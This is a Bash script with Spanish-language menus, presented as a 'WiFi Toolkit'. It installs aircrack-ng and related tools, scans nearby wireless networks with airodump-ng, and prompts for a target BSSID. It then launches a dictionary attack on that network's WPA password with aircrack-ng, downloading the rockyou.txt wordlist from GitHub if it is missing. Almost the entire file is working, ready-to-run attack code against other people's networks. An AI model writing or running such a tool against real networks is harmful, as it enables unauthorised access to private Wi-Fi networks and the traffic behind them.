#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")

# Función para mostrar progreso
show_progress() {
    local duration=$1
    local step=$((100 / duration))
    local progress=0

    while [ $progress -le 100 ]; do
        dialog --gauge "Instalando dependencias..." 10 50 $progress
        sleep 1
        ((progress += step))
    done
}

# Verificar e instalar dependencias
install_dependencies() {
    missing_dependencies=()

    dialog --title "Verificación de Dependencias" --msgbox "Listado de dependencias necesarias:\n\n${DEPENDENCIES[*]}" 12 50

    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing_dependencies+=("$dep")
        fi
    done

    if [ ${#missing_dependencies[@]} -eq 0 ]; then
        dialog --title "Dependencias" --msgbox "Todas las dependencias ya están instaladas." 8 40
        return
    fi

    dialog --title "Instalación de Dependencias" --msgbox "Se necesitan las siguientes dependencias:\n\n${missing_dependencies[*]}" 12 50

    for dep in "${missing_dependencies[@]}"; do
        dialog --title "Instalación de $dep" --infobox "Instalando $dep..." 8 40
        if [[ "$dep" == "hcxpcapngtool" ]]; then
            sudo apt-get install -y hcxtools &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        else
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done

    show_progress 10

    dialog --title "Dependencias" --msgbox "Todas las dependencias han sido instaladas correctamente." 8 40
}

# Crear carpetas del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
}

# Menú principal
default_menu() {
    sleep 10
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Escaneo en vivo de redes" \
            2 "Analizar redes WPA/WPA2/WPA3 y atacar" \
            3 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) live_scan_networks ;;
            2) analyze_and_attack_network ;;
            3) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
        esac
    done
}

# Escaneo en vivo de redes WiFi
live_scan_networks() {
    interface=$(detect_wireless_interface)
    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" &
    sleep 10
    killall airodump-ng
    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
}

# Mostrar resultados del escaneo en vivo
show_scan_results() {
    local scan_file=$1
    if [[ -f "$scan_file" ]]; then
        dialog --title "Resultados del Escaneo" --textbox "$scan_file" 20 80
    else
        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 40
    fi
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Analizar redes WPA/WPA2/WPA3 y realizar ataque
analyze_and_attack_network() {
    local interface=$(detect_wireless_interface)
    dialog --title "Escaneo" --infobox "Escaneando redes WPA/WPA2/WPA3..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/wpa_scan" &
    sleep 10
    killall airodump-ng

    cap_file=$(find "$RESULTS_DIR" -type f -name "wpa_scan*.cap" | head -n 1)
    if [[ -z "$cap_file" ]]; then
        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap." 8 40
        return
    fi

    network=$(dialog --title "Seleccione una Red" --inputbox "Introduce el BSSID de la red que deseas atacar:" 10 50 3>&1 1>&2 2>&3)
    dictionary=$(find_or_download_dictionary)

    dialog --title "Ataque" --infobox "Iniciando ataque contra $network..." 8 40
    xterm -hold -e "aircrack-ng -w $dictionary -b $network $cap_file" &
}

# Buscar o descargar diccionario rockyou.txt
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Inicio del script
install_dependencies
prepare_project_directory
default_menu
